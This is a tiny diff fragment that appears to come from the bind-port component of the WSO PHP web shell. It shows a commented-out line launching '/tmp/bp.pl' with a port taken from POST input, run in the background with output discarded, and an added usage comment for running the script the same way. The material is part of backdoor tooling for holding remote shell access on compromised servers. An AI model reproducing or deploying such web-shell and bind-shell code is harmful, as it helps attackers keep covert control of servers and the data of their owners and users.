@@ -19,3 +19,4 @@ while(1) {
 	}
 }
 #$out = wsoEx("perl /tmp/bp.pl ".$_POST['p2']." 1>/dev/null 2>&1 &");
+#perl bp.pl [port] 1>/dev/null 2>&1 &
